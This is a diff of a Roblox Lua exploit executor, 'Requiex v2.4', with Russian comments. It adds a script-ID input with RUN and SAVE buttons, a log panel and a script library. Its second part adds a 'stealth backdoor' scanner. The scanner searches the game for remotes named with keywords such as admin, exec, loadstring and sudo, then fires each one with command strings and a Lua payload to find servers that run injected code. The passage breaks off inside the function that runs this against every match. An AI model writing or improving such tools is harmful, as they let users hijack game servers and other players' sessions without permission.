@@ -1,580 +1,834 @@
-local Requix = {}
+-- Requiex v2.4 Unified | Часть 1/3
+local Requiex = {}
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui") or Players.LocalPlayer:WaitForChild("PlayerGui")
 
 local Colors = {
-    Panel = Color3.fromRGB(20,20,25),
-    PanelLight = Color3.fromRGB(28,28,34),
-    AccentGreen = Color3.fromRGB(80,220,120),
-    AccentGreenDim = Color3.fromRGB(50,150,80),
-    AccentGreenNeon = Color3.fromRGB(120,255,160),
-    Text = Color3.fromRGB(225,225,230),
-    SubText = Color3.fromRGB(145,145,155),
-    Stroke = Color3.fromRGB(55,55,65),
-    Hover = Color3.fromRGB(32,32,38),
-    Danger = Color3.fromRGB(220,75,80),
-    AccentBlue = Color3.fromRGB(60,140,255)
+    Panel = Color3.fromRGB(18,18,22), Glass = Color3.fromRGB(28,28,34),
+    GlassHover = Color3.fromRGB(45,45,52), AccentYellow = Color3.fromRGB(255,180,0),
+    AccentYellowBright = Color3.fromRGB(255,210,50), AccentYellowDim = Color3.fromRGB(200,140,0),
+    Text = Color3.fromRGB(225,225,230), SubText = Color3.fromRGB(150,150,160),
+    Stroke = Color3.fromRGB(60,60,70), Dark = Color3.fromRGB(12,12,15),
+    Black = Color3.fromRGB(0,0,0), White = Color3.fromRGB(255,255,255),
+    LogBackground = Color3.fromRGB(20,20,26), Green = Color3.fromRGB(80,220,120),
+    Red = Color3.fromRGB(255,80,80), DarkGray = Color3.fromRGB(22,22,26)
 }
-local BgTrans = 0.1
-local PnTrans = 0.12
+local BgTrans = 0.08
+local GlassTrans = 0.55
 
-if CoreGui:FindFirstChild("Requix") then CoreGui.Requix:Destroy() end
+-- Cleanup
+if CoreGui:FindFirstChild("Requiex") then CoreGui.Requiex:Destroy() end
+
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "Requix"
+ScreenGui.Name = "Requiex"
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.ResetOnSpawn = false
 ScreenGui.DisplayOrder = 999
 ScreenGui.Parent = CoreGui
 
-local BlurBg = Instance.new("Frame")
-BlurBg.Size = UDim2.new(1,0,1,0)
-BlurBg.BackgroundColor3 = Color3.new(0,0,0)
-BlurBg.BackgroundTransparency = 0.85
-BlurBg.BorderSizePixel = 0
-BlurBg.ZIndex = 98
-BlurBg.Visible = false
-BlurBg.Parent = ScreenGui
-pcall(function() local b = Instance.new("BlurEffect") b.Size = 15 b.Parent = BlurBg end)
+local Connections = {}
+local function SafeConnect(obj, event, func)
+    local conn = obj[event]:Connect(func)
+    table.insert(Connections, conn)
+    return conn
+end
+ScreenGui.Destroying:Connect(function()
+    for _, conn in ipairs(Connections) do pcall(function() conn:Disconnect() end) end
+    Connections = {}
+end)
 
+-- Основной фрейм 400x280
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0,310,0,200)
-MainFrame.Position = UDim2.new(0.5,-155,0.5,-100)
+MainFrame.Size = UDim2.new(0,400,0,280)
+MainFrame.Position = UDim2.new(0.5,-200,0.5,-140)
 MainFrame.BackgroundColor3 = Colors.Panel
 MainFrame.BackgroundTransparency = BgTrans
 MainFrame.BorderSizePixel = 0
-MainFrame.ZIndex = 100
+MainFrame.ZIndex = 1
 MainFrame.Parent = ScreenGui
 Instance.new("UIStroke",MainFrame).Color = Colors.Stroke
 MainFrame.UIStroke.Thickness = 1.5
-MainFrame.UIStroke.Transparency = 0.3
+MainFrame.UIStroke.Transparency = 0.2
 Instance.new("UICorner",MainFrame).CornerRadius = UDim.new(0,10)
 
+-- TopBar
 local TopBar = Instance.new("Frame")
-TopBar.Size = UDim2.new(1,0,0,36)
-TopBar.BackgroundColor3 = Color3.fromRGB(12,12,15)
+TopBar.Size = UDim2.new(1,0,0,42)
+TopBar.BackgroundColor3 = Colors.Dark
 TopBar.BackgroundTransparency = BgTrans
 TopBar.BorderSizePixel = 0
-TopBar.ZIndex = 110
+TopBar.ZIndex = 2
 TopBar.Parent = MainFrame
 Instance.new("UICorner",TopBar).CornerRadius = UDim.new(0,10)
-
 local TopBarCover = Instance.new("Frame")
 TopBarCover.Size = UDim2.new(1,0,0,10)
 TopBarCover.Position = UDim2.new(0,0,1,-10)
-TopBarCover.BackgroundColor3 = Color3.fromRGB(12,12,15)
+TopBarCover.BackgroundColor3 = Colors.Dark
 TopBarCover.BackgroundTransparency = BgTrans
 TopBarCover.BorderSizePixel = 0
-TopBarCover.ZIndex = 110
+TopBarCover.ZIndex = 2
 TopBarCover.Parent = TopBar
 
-local Logo = Instance.new("TextLabel")
-Logo.Size = UDim2.new(0,90,0,20)
-Logo.AnchorPoint = Vector2.new(0,0.5)
-Logo.Position = UDim2.new(0,10,0.5,0)
-Logo.BackgroundTransparency = 1
-Logo.Font = Enum.Font.GothamBold
-Logo.Text = "REQUIX"
-Logo.TextSize = 14
-Logo.TextColor3 = Colors.SubText
-Logo.TextXAlignment = Enum.TextXAlignment.Left
-Logo.ZIndex = 111
-Logo.Parent = TopBar
+local LogoR = Instance.new("TextLabel")
+LogoR.Size = UDim2.new(0,20,0,24)
+LogoR.AnchorPoint = Vector2.new(0,0.5)
+LogoR.Position = UDim2.new(0,12,0.5,0)
+LogoR.BackgroundTransparency = 1
+LogoR.Font = Enum.Font.GothamBlack
+LogoR.Text = "R"
+LogoR.TextSize = 22
+LogoR.TextColor3 = Colors.AccentYellow
+LogoR.TextXAlignment = Enum.TextXAlignment.Left
+LogoR.ZIndex = 3
+LogoR.Parent = TopBar
+local LogoRest = Instance.new("TextLabel")
+LogoRest.Size = UDim2.new(0,80,0,22)
+LogoRest.AnchorPoint = Vector2.new(0,0.5)
+LogoRest.Position = UDim2.new(0,32,0.5,0)
+LogoRest.BackgroundTransparency = 1
+LogoRest.Font = Enum.Font.GothamBold
+LogoRest.Text = "EQUIEX"
+LogoRest.TextSize = 15
+LogoRest.TextColor3 = Colors.White
+LogoRest.TextXAlignment = Enum.TextXAlignment.Left
+LogoRest.ZIndex = 3
+LogoRest.Parent = TopBar
 
+-- Сворачивание/закрытие
 local MiniBtn = Instance.new("TextButton")
-MiniBtn.Size = UDim2.new(0,30,0,30)
+MiniBtn.Size = UDim2.new(0,44,0,44)
 MiniBtn.AnchorPoint = Vector2.new(0.5,0.5)
-MiniBtn.Position = UDim2.new(1,-47,0.5,0)
+MiniBtn.Position = UDim2.new(1,-50,0.5,0)
 MiniBtn.BackgroundTransparency = 1
-MiniBtn.Font = Enum.Font.GothamBold
+MiniBtn.Font = Enum.Font.SourceSansLight
 MiniBtn.Text = "—"
-MiniBtn.TextSize = 18
+MiniBtn.TextSize = 26
 MiniBtn.TextColor3 = Colors.SubText
-MiniBtn.ZIndex = 115
+MiniBtn.ZIndex = 3
+MiniBtn.AutoButtonColor = false
 MiniBtn.Parent = TopBar
 
 local MiniIcon = Instance.new("Frame")
-MiniIcon.Size = UDim2.new(0,40,0,40)
-MiniIcon.Position = UDim2.new(0.5,-20,0.5,-20)
+MiniIcon.Size = UDim2.new(0,44,0,44)
+MiniIcon.Position = UDim2.new(0.5,-22,0.5,-22)
 MiniIcon.BackgroundColor3 = Colors.Panel
 MiniIcon.BackgroundTransparency = BgTrans
 MiniIcon.Visible = false
-MiniIcon.ZIndex = 200
+MiniIcon.ZIndex = 3
 MiniIcon.Parent = ScreenGui
 Instance.new("UICorner",MiniIcon).CornerRadius = UDim.new(0,10)
 Instance.new("UIStroke",MiniIcon).Color = Colors.Stroke
 MiniIcon.UIStroke.Thickness = 1.5
-MiniIcon.UIStroke.Transparency = 0.3
-
+MiniIcon.UIStroke.Transparency = 0.2
 local MiniLogo = Instance.new("TextLabel")
 MiniLogo.Size = UDim2.new(1,0,1,0)
 MiniLogo.BackgroundTransparency = 1
-MiniLogo.Font = Enum.Font.GothamBold
+MiniLogo.Font = Enum.Font.GothamBlack
 MiniLogo.Text = "R"
-MiniLogo.TextSize = 20
-MiniLogo.TextColor3 = Colors.AccentGreen
-MiniLogo.ZIndex = 202
+MiniLogo.TextSize = 24
+MiniLogo.TextColor3 = Colors.AccentYellow
+MiniLogo.ZIndex = 4
 MiniLogo.Parent = MiniIcon
 
-local function Minimize() MainFrame.Visible = false MiniIcon.Visible = true BlurBg.Visible = false end
-local function Maximize() MainFrame.Visible = true MiniIcon.Visible = false BlurBg.Visible = true end
-MiniBtn.Activated:Connect(Minimize)
-MiniIcon.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then Maximize() end end)
+local function Minimize() MainFrame.Visible = false MiniIcon.Visible = true end
+local function Maximize() MainFrame.Visible = true MiniIcon.Visible = false end
+SafeConnect(MiniBtn, "Activated", Minimize)
+SafeConnect(MiniIcon, "InputBegan", function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then Maximize() end
+end)
 
 local CloseBtn = Instance.new("TextButton")
-CloseBtn.Size = UDim2.new(0,30,0,30)
+CloseBtn.Size = UDim2.new(0,44,0,44)
 CloseBtn.AnchorPoint = Vector2.new(0.5,0.5)
-CloseBtn.Position = UDim2.new(1,-15,0.5,0)
+CloseBtn.Position = UDim2.new(1,-16,0.5,0)
 CloseBtn.BackgroundTransparency = 1
-CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.Font = Enum.Font.SourceSansLight
 CloseBtn.Text = "✕"
-CloseBtn.TextSize = 16
+CloseBtn.TextSize = 22
 CloseBtn.TextColor3 = Colors.SubText
-CloseBtn.ZIndex = 115
+CloseBtn.ZIndex = 3
+CloseBtn.AutoButtonColor = false
 CloseBtn.Parent = TopBar
-CloseBtn.Activated:Connect(function() ScreenGui:Destroy() end)
+SafeConnect(CloseBtn, "Activated", function() ScreenGui:Destroy() end)
 
+for _, btn in ipairs({MiniBtn, CloseBtn}) do
+    SafeConnect(btn, "MouseEnter", function() TweenService:Create(btn,TweenInfo.new(0.2),{TextColor3 = Colors.AccentYellow}):Play() end)
+    SafeConnect(btn, "MouseLeave", function() TweenService:Create(btn,TweenInfo.new(0.2),{TextColor3 = Colors.SubText}):Play() end)
+end
+
+-- Контент
 local Content = Instance.new("Frame")
-Content.Size = UDim2.new(1,-16,1,-44)
-Content.Position = UDim2.new(0,8,0,44)
+Content.Size = UDim2.new(1,-16,1,-50)
+Content.Position = UDim2.new(0,8,0,46)
 Content.BackgroundTransparency = 1
-Content.ZIndex = 102
+Content.ZIndex = 1
 Content.Parent = MainFrame
 
-local TabFrame = Instance.new("Frame")
-TabFrame.Size = UDim2.new(1,0,0,24)
-TabFrame.Position = UDim2.new(0,0,0,0)
-TabFrame.BackgroundTransparency = 1
-TabFrame.ZIndex = 103
-TabFrame.Parent = Content
-local TabLayout = Instance.new("UIListLayout")
-TabLayout.FillDirection = Enum.FillDirection.Horizontal
-TabLayout.Padding = UDim.new(0,4)
-TabLayout.Parent = TabFrame
-
-local TabContent = Instance.new("Frame")
-TabContent.Size = UDim2.new(1,0,1,-30)
-TabContent.Position = UDim2.new(0,0,0,30)
-TabContent.BackgroundTransparency = 1
-TabContent.ZIndex = 102
-TabContent.Parent = Content
-
-local tabs = {}
-local currentTab = nil
-
-function Requix:CreateTab(name, icon)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0,90,0,22)
-    btn.BackgroundColor3 = Colors.PanelLight
-    btn.BackgroundTransparency = PnTrans
-    btn.BorderSizePixel = 0
-    btn.Font = Enum.Font.Gotham
-    btn.Text = (icon or "") .. " " .. name
-    btn.TextSize = 10
-    btn.TextColor3 = Colors.SubText
-    btn.ZIndex = 104
-    btn.Parent = TabFrame
-    Instance.new("UICorner",btn).CornerRadius = UDim.new(0,5)
-
-    local page = Instance.new("Frame")
-    page.Size = UDim2.new(1,0,1,0)
-    page.BackgroundTransparency = 1
-    page.Visible = false
-    page.ZIndex = 102
-    page.Parent = TabContent
-
-    local tabData = { button = btn, page = page }
-    table.insert(tabs, tabData)
-
-    btn.Activated:Connect(function() Requix:SelectTab(tabData) end)
-    if #tabs == 1 then Requix:SelectTab(tabData) end
-    return page
-end
-
-function Requix:SelectTab(tabData)
-    for _, t in ipairs(tabs) do
-        local active = (t == tabData)
-        t.page.Visible = active
-        if active then
-            TweenService:Create(t.button, TweenInfo.new(0.2), { BackgroundColor3 = Colors.AccentGreenDim, TextColor3 = Colors.Text }):Play()
-            currentTab = t
-        else
-            TweenService:Create(t.button, TweenInfo.new(0.2), { BackgroundColor3 = Colors.PanelLight, TextColor3 = Colors.SubText }):Play()
-        end
-    end
-end
-
-local clientPage = Requix:CreateTab("Client", "💻")
-
+-- Execution Zone
 local InputFrame = Instance.new("Frame")
-InputFrame.Size = UDim2.new(1,0,0,34)
+InputFrame.Size = UDim2.new(1,0,0,42)
 InputFrame.Position = UDim2.new(0,0,0,4)
-InputFrame.BackgroundColor3 = Colors.PanelLight
-InputFrame.BackgroundTransparency = PnTrans
+InputFrame.BackgroundColor3 = Colors.Glass
+InputFrame.BackgroundTransparency = GlassTrans
 InputFrame.BorderSizePixel = 0
-InputFrame.ZIndex = 105
-InputFrame.Parent = clientPage
-Instance.new("UICorner",InputFrame).CornerRadius = UDim.new(0,8)
-Instance.new("UIStroke",InputFrame).Color = Colors.Stroke
+InputFrame.ZIndex = 2
+InputFrame.Parent = Content
+Instance.new("UICorner",InputFrame).CornerRadius = UDim.new(0,10)
+Instance.new("UIStroke",InputFrame).Color = Color3.fromRGB(90,90,100)
 InputFrame.UIStroke.Thickness = 1
-InputFrame.UIStroke.Transparency = 0.4
+InputFrame.UIStroke.Transparency = 0.5
 
 local TextBox = Instance.new("TextBox")
-TextBox.Size = UDim2.new(1,-58,1,0)
+TextBox.Size = UDim2.new(1,-130,1,0)
 TextBox.Position = UDim2.new(0,0,0,0)
 TextBox.BackgroundTransparency = 1
-TextBox.Font = Enum.Font.Gotham
-TextBox.PlaceholderText = "Enter Script ID..."
-TextBox.PlaceholderColor3 = Color3.fromRGB(90,90,100)
+TextBox.Font = Enum.Font.RobotoMono
+TextBox.PlaceholderText = "require(ID) or Script ID..."
+TextBox.PlaceholderColor3 = Color3.fromRGB(80,80,90)
 TextBox.Text = ""
-TextBox.TextSize = 12
+TextBox.TextSize = 13
 TextBox.TextColor3 = Colors.Text
 TextBox.TextXAlignment = Enum.TextXAlignment.Left
 TextBox.ClearTextOnFocus = false
-TextBox.ZIndex = 107
+TextBox.ZIndex = 3
 TextBox.Parent = InputFrame
-Instance.new("UIPadding",TextBox).PaddingLeft = UDim.new(0,10)
+Instance.new("UIPadding",TextBox).PaddingLeft = UDim.new(0,14)
 
+-- SAVE
+local SaveBtn = Instance.new("TextButton")
+SaveBtn.Size = UDim2.new(0,50,0,34)
+SaveBtn.AnchorPoint = Vector2.new(1,0.5)
+SaveBtn.Position = UDim2.new(1,-72,0.5,0)
+SaveBtn.BackgroundColor3 = Colors.AccentYellow
+SaveBtn.BorderSizePixel = 0
+SaveBtn.Font = Enum.Font.GothamBold
+SaveBtn.Text = "SAVE"
+SaveBtn.TextSize = 12
+SaveBtn.TextColor3 = Colors.Black
+SaveBtn.ZIndex = 3
+SaveBtn.AutoButtonColor = false
+SaveBtn.Parent = InputFrame
+Instance.new("UICorner",SaveBtn).CornerRadius = UDim.new(0,8)
+SafeConnect(SaveBtn, "MouseEnter", function() TweenService:Create(SaveBtn,TweenInfo.new(0.2),{BackgroundColor3 = Colors.AccentYellowBright}):Play() end)
+SafeConnect(SaveBtn, "MouseLeave", function() TweenService:Create(SaveBtn,TweenInfo.new(0.25),{BackgroundColor3 = Colors.AccentYellow}):Play() end)
+
+-- RUN
 local ExecBtn = Instance.new("TextButton")
-ExecBtn.Size = UDim2.new(0,42,0,28)
+ExecBtn.Size = UDim2.new(0,64,0,34)
 ExecBtn.AnchorPoint = Vector2.new(1,0.5)
 ExecBtn.Position = UDim2.new(1,-4,0.5,0)
-ExecBtn.BackgroundColor3 = Colors.AccentGreen
+ExecBtn.BackgroundColor3 = Colors.DarkGray
 ExecBtn.BorderSizePixel = 0
 ExecBtn.Font = Enum.Font.GothamBold
-ExecBtn.Text = "▶"
-ExecBtn.TextSize = 14
-ExecBtn.TextColor3 = Color3.fromRGB(20,20,25)
-ExecBtn.ZIndex = 110
+ExecBtn.Text = "▶ RUN"
+ExecBtn.TextSize = 13
+ExecBtn.TextColor3 = Colors.AccentYellow
+ExecBtn.ZIndex = 3
+ExecBtn.AutoButtonColor = false
 ExecBtn.Parent = InputFrame
-Instance.new("UICorner",ExecBtn).CornerRadius = UDim.new(0,6)
+Instance.new("UICorner",ExecBtn).CornerRadius = UDim.new(0,8)
+local ExecStroke = Instance.new("UIStroke")
+ExecStroke.Color = Colors.AccentYellowBright
+ExecStroke.Thickness = 2
+ExecStroke.Transparency = 0.1
+ExecStroke.ZIndex = 4
+ExecStroke.Parent = ExecBtn
+SafeConnect(ExecBtn, "MouseEnter", function()
+    TweenService:Create(ExecBtn,TweenInfo.new(0.2),{BackgroundColor3 = Colors.Dark, TextColor3 = Colors.White}):Play()
+    TweenService:Create(ExecStroke,TweenInfo.new(0.2),{Thickness = 2.5, Transparency = 0}):Play()
+end)
+SafeConnect(ExecBtn, "MouseLeave", function()
+    TweenService:Create(ExecBtn,TweenInfo.new(0.25),{BackgroundColor3 = Colors.DarkGray, TextColor3 = Colors.AccentYellow}):Play()
+    TweenService:Create(ExecStroke,TweenInfo.new(0.25),{Thickness = 2, Transparency = 0.1}):Play()
+end)
 
-local ExecGlow = Instance.new("UIStroke")
-ExecGlow.Color = Colors.AccentGreenNeon
-ExecGlow.Thickness = 2
-ExecGlow.Transparency = 0.5
-ExecGlow.ZIndex = 111
-ExecGlow.Parent = ExecBtn
+-- Логи
+local LogFrame = Instance.new("Frame")
+LogFrame.Size = UDim2.new(1,0,0,70)
+LogFrame.Position = UDim2.new(0,0,0,56)
+LogFrame.BackgroundColor3 = Colors.LogBackground
+LogFrame.BackgroundTransparency = 0.1
+LogFrame.BorderSizePixel = 0
+LogFrame.ZIndex = 2
+LogFrame.Parent = Content
+Instance.new("UICorner",LogFrame).CornerRadius = UDim.new(0,8)
+Instance.new("UIStroke",LogFrame).Color = Colors.Stroke
+LogFrame.UIStroke.Thickness = 1
+LogFrame.UIStroke.Transparency = 0.6
+local LogHeader = Instance.new("TextLabel")
+LogHeader.Size = UDim2.new(1,-12,0,14)
+LogHeader.Position = UDim2.new(0,6,0,4)
+LogHeader.BackgroundTransparency = 1
+LogHeader.Font = Enum.Font.GothamBold
+LogHeader.Text = "LOGS:"
+LogHeader.TextSize = 9
+LogHeader.TextColor3 = Colors.SubText
+LogHeader.TextXAlignment = Enum.TextXAlignment.Left
+LogHeader.ZIndex = 3
+LogHeader.Parent = LogFrame
+local LogScroll = Instance.new("ScrollingFrame")
+LogScroll.Size = UDim2.new(1,-12,1,-24)
+LogScroll.Position = UDim2.new(0,6,0,18)
+LogScroll.BackgroundTransparency = 1
+LogScroll.BorderSizePixel = 0
+LogScroll.ScrollBarThickness = 3
+LogScroll.ScrollBarImageColor3 = Colors.Stroke
+LogScroll.CanvasSize = UDim2.new(0,0,0,0)
+LogScroll.ZIndex = 3
+LogScroll.Parent = LogFrame
+local LogList = Instance.new("UIListLayout")
+LogList.SortOrder = Enum.SortOrder.LayoutOrder
+LogList.Padding = UDim.new(0,1)
+LogList.Parent = LogScroll
+local StatusIndicator = Instance.new("Frame")
+StatusIndicator.Size = UDim2.new(1,0,0,2)
+StatusIndicator.Position = UDim2.new(0,0,1,-2)
+StatusIndicator.BackgroundColor3 = Colors.AccentYellow
+StatusIndicator.BorderSizePixel = 0
+StatusIndicator.ZIndex = 3
+StatusIndicator.Parent = LogFrame
 
-local ScriptHistory = {}
-local HistoryOpen = false
+function Requiex:Log(message, color)
+    color = color or Colors.SubText
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1,-4,0,14)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.RobotoMono
+    label.Text = "[" .. os.date("%H:%M:%S") .. "] " .. message
+    label.TextSize = 9
+    label.TextColor3 = color
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.LayoutOrder = #LogScroll:GetChildren() + 1
+    label.Parent = LogScroll
+    local children = LogScroll:GetChildren()
+    local count = 0
+    for _, c in ipairs(children) do if c:IsA("TextLabel") then count = count + 1 end end
+    while count > 40 do
+        local first
+        for _, c in ipairs(children) do if c:IsA("TextLabel") then first = c break end end
+        if first then first:Destroy() end
+        count = count - 1
+    end
+    LogScroll.CanvasSize = UDim2.new(0,0,0,count * 15 + 2)
+    LogScroll.CanvasPosition = Vector2.new(0, LogScroll.CanvasSize.Y.Offset)
+end
+function Requiex:SetStatus(color) StatusIndicator.BackgroundColor3 = color or Colors.AccentYellow end
 
-local HistBtn = Instance.new("TextButton")
-HistBtn.Size = UDim2.new(0,30,0,28)
-HistBtn.Position = UDim2.new(0,4,0,46)
-HistBtn.BackgroundColor3 = Colors.PanelLight
-HistBtn.BackgroundTransparency = PnTrans
-HistBtn.BorderSizePixel = 0
-HistBtn.Font = Enum.Font.GothamBold
-HistBtn.Text = "⌄"
-HistBtn.TextSize = 14
-HistBtn.TextColor3 = Colors.SubText
-HistBtn.ZIndex = 105
-HistBtn.Parent = clientPage
-Instance.new("UICorner",HistBtn).CornerRadius = UDim.new(0,6)
+Requiex:Log("Requiex v2.4 online", Colors.AccentYellow)
 
-local HistDrop = Instance.new("Frame")
-HistDrop.Size = UDim2.new(0,200,0,0)
-HistDrop.Position = UDim2.new(0,4,0,78)
-HistDrop.BackgroundColor3 = Colors.PanelLight
-HistDrop.BackgroundTransparency = PnTrans
-HistDrop.BorderSizePixel = 0
-HistDrop.ClipsDescendants = true
-HistDrop.Visible = false
-HistDrop.ZIndex = 120
-HistDrop.Parent = clientPage
-Instance.new("UICorner",HistDrop).CornerRadius = UDim.new(0,8)
-Instance.new("UIStroke",HistDrop).Color = Colors.Stroke
-HistDrop.UIStroke.Thickness = 1
-HistDrop.UIStroke.Transparency = 0.4
+-- Библиотека (будет заполняться)
+local ScriptLibrary = {}
+local LibOpen = false
+local LibDrop = Instance.new("Frame")
+LibDrop.Size = UDim2.new(0,240,0,0)
+LibDrop.AnchorPoint = Vector2.new(0,1)
+LibDrop.Position = UDim2.new(0,0,0,-5)
+LibDrop.BackgroundColor3 = Colors.Glass
+LibDrop.BackgroundTransparency = GlassTrans
+LibDrop.BorderSizePixel = 0
+LibDrop.ClipsDescendants = true
+LibDrop.Visible = false
+LibDrop.ZIndex = 4
+LibDrop.Parent = Content
+Instance.new("UICorner",LibDrop).CornerRadius = UDim.new(0,10)
+Instance.new("UIStroke",LibDrop).Color = Color3.fromRGB(90,90,100)
+LibDrop.UIStroke.Thickness = 1
+LibDrop.UIStroke.Transparency = 0.5
+local LibList = Instance.new("ScrollingFrame")
+LibList.Size = UDim2.new(1,-4,1,-4)
+LibList.Position = UDim2.new(0,2,0,2)
+LibList.BackgroundTransparency = 1
+LibList.BorderSizePixel = 0
+LibList.ScrollBarThickness = 3
+LibList.ScrollBarImageColor3 = Colors.Stroke
+LibList.CanvasSize = UDim2.new(0,0,0,0)
+LibList.ZIndex = 4
+LibList.Parent = LibDrop
+local LibLayout = Instance.new("UIListLayout")
+LibLayout.SortOrder = Enum.SortOrder.LayoutOrder
+LibLayout.Padding = UDim.new(0,2)
+LibLayout.Parent = LibList
 
-local HistList = Instance.new("ScrollingFrame")
-HistList.Size = UDim2.new(1,-4,1,-4)
-HistList.Position = UDim2.new(0,2,0,2)
-HistList.BackgroundTransparency = 1
-HistList.BorderSizePixel = 0
-HistList.ScrollBarThickness = 3
-HistList.ScrollBarImageColor3 = Colors.Stroke
-HistList.CanvasSize = UDim2.new(0,0,0,0)
-HistList.ZIndex = 122
-HistList.Parent = HistDrop
-
-local HistLayout = Instance.new("UIListLayout")
-HistLayout.SortOrder = Enum.SortOrder.LayoutOrder
-HistLayout.Padding = UDim.new(0,2)
-HistLayout.Parent = HistList
-
-local function RefreshHistory()
-    for _, c in ipairs(HistList:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
-    for _, entry in ipairs(ScriptHistory) do
+local function RefreshLibrary()
+    for _, c in ipairs(LibList:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
+    local count = math.min(#ScriptLibrary, 5)
+    for i = 1, count do
+        local entry = ScriptLibrary[i]
         local eb = Instance.new("TextButton")
-        eb.Size = UDim2.new(1,0,0,26)
+        eb.Size = UDim2.new(1,0,0,30)
         eb.BackgroundTransparency = 1
-        eb.Font = Enum.Font.Gotham
-        eb.Text = entry.Name or ("Script #" .. entry.ID)
+        eb.Font = Enum.Font.RobotoMono
+        eb.Text = entry.Name or ("#" .. entry.ID)
         eb.TextSize = 11
         eb.TextColor3 = Colors.SubText
         eb.TextXAlignment = Enum.TextXAlignment.Left
-        eb.ZIndex = 123
-        eb.Parent = HistList
-        Instance.new("UIPadding",eb).PaddingLeft = UDim.new(0,8)
+        eb.ZIndex = 4
+        eb.Parent = LibList
+        Instance.new("UIPadding",eb).PaddingLeft = UDim.new(0,10)
         eb.Activated:Connect(function()
             TextBox.Text = tostring(entry.ID)
-            HistDrop.Visible = false
-            HistoryOpen = false
+            LibDrop.Visible = false
+            LibOpen = false
+            Requiex:Log("Loaded: "..entry.ID, Colors.AccentYellow)
         end)
     end
-    HistList.CanvasSize = UDim2.new(0,0,0,#ScriptHistory * 28)
-    local cnt = math.min(#ScriptHistory, 6)
-    HistDrop.Size = UDim2.new(0,200,0,cnt * 28 + 8)
+    LibList.CanvasSize = UDim2.new(0,0,0,count * 32)
+    LibDrop.Size = UDim2.new(0,240,0,count * 32 + 8)
+    LibLayout:ApplyLayout()
 end
 
-HistBtn.Activated:Connect(function()
-    HistoryOpen = not HistoryOpen
-    HistDrop.Visible = HistoryOpen
-    if HistoryOpen then HistDrop.ZIndex = 120 RefreshHistory() end
-end)
+-- =====================================================
+-- Конец Части 1/3
+-- =====================================================-- =====================================================
+-- Requiex v2.4 Unified | Часть 2/3
+-- =====================================================
 
-local ActionBar = Instance.new("Frame")
-ActionBar.Size = UDim2.new(1,0,0,30)
-ActionBar.Position = UDim2.new(0,0,1,-34)
-ActionBar.BackgroundTransparency = 1
-ActionBar.ZIndex = 105
-ActionBar.Parent = clientPage
+-- ===== STEALTH BACKDOOR OPERATOR =====
+local StealthBackdoor = {
+    Exploited = false,
+    BackdoorObjects = {},
+    FoundCommands = {},
+}
 
-local ActLayout = Instance.new("UIListLayout")
-ActLayout.FillDirection = Enum.FillDirection.Horizontal
-ActLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
-ActLayout.VerticalAlignment = Enum.VerticalAlignment.Center
-ActLayout.Padding = UDim.new(0,6)
-ActLayout.Parent = ActionBar
-
-local function CreateActionButton(name, icon, callback)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0,85,0,28)
-    btn.BackgroundColor3 = Colors.PanelLight
-    btn.BackgroundTransparency = PnTrans
-    btn.BorderSizePixel = 0
-    btn.Font = Enum.Font.Gotham
-    btn.Text = (icon or "") .. " " .. name
-    btn.TextSize = 11
-    btn.TextColor3 = Colors.SubText
-    btn.ZIndex = 106
-    btn.LayoutOrder = #ActionBar:GetChildren() + 1
-    btn.Parent = ActionBar
-    Instance.new("UICorner",btn).CornerRadius = UDim.new(0,6)
-    local stk = Instance.new("UIStroke")
-    stk.Color = Colors.Stroke
-    stk.Thickness = 1
-    stk.Transparency = 0.4
-    stk.Parent = btn
-    btn.Activated:Connect(function()
-        callback()
-        TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3 = Colors.AccentGreenDim}):Play()
-        task.wait(0.1)
-        TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3 = Colors.PanelLight}):Play()
+local function GetScriptSource(scr)
+    local success, src = pcall(function()
+        if getscriptsource then return getscriptsource(scr) end
+        error("no")
     end)
+    return success and src or nil
+end
+
+function StealthBackdoor:FindRemotes()
+    local remotes = {}
+    local containers = {ReplicatedStorage, game:GetService("Workspace"), game:GetService("Lighting"), Players.LocalPlayer:FindFirstChild("PlayerGui")}
+    local keywords = {"admin","cmd","exec","run","backdoor","bd","eval","loadstring","execute","command","console","op","sudo","give","set","kick","ban","teleport","fly","god","inject","remote","handler"}
+    for _, container in ipairs(containers) do
+        if container then
+            for _, obj in ipairs(container:GetDescendants()) do
+                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+                    local name = obj.Name:lower()
+                    for _, kw in ipairs(keywords) do
+                        if name:find(kw) then table.insert(remotes, obj) break end
+                    end
+                end
+            end
+        end
+    end
+    self.BackdoorObjects = remotes
+    return remotes
+end
+
+function StealthBackdoor:TestRemote(remote)
+    local testCommands = {"exec", "run", "execute", "eval", "cmd"}
+    for _, cmd in ipairs(testCommands) do
+        local ok
+        if remote:IsA("RemoteEvent") then
+            ok = pcall(function() remote:FireServer(cmd, "print('test')") end)
+        else
+            ok = pcall(function() remote:InvokeServer(cmd, "print('test')") end)
+        end
+        if ok then
+            if not self.FoundCommands[remote] then self.FoundCommands[remote] = {} end
+            table.insert(self.FoundCommands[remote], cmd)
+            Requiex:Log("Backdoor: "..remote.Name.." accepts "..cmd, Colors.Green)
+            return true
+        end
+        task.wait(0.1)
+    end
+    return false
+end
+
+function StealthBackdoor:ExploitAll()
+    local any = false
+    for _, remote in ipairs(self.BackdoorObjects) do
+        if self:TestRemote(remote) then any = true end
+        task.wait(0.2)
+    end
+    self.Exploited = any
+    if any then
